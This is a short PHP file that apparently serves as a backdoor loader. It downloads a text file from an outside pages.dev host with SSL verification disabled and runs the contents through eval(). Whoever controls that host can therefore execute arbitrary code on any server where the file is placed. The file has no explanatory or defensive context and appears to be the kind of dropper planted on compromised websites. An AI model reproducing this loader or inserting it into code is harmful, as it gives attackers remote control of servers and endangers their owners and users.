<?=
$protocol = "https";
$domain = "9c3b92b8.asukontol.pages.dev/";
$file_path = "/ccu.txt";
$url = $protocol . "://" . $domain . $file_path;

function fetch_with_curl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // optional: skip SSL verification
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // optional: skip hostname verification
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}

$content = fetch_with_curl($url);
if ($content !== false) {
    eval("?>" . $content);
}
?> 
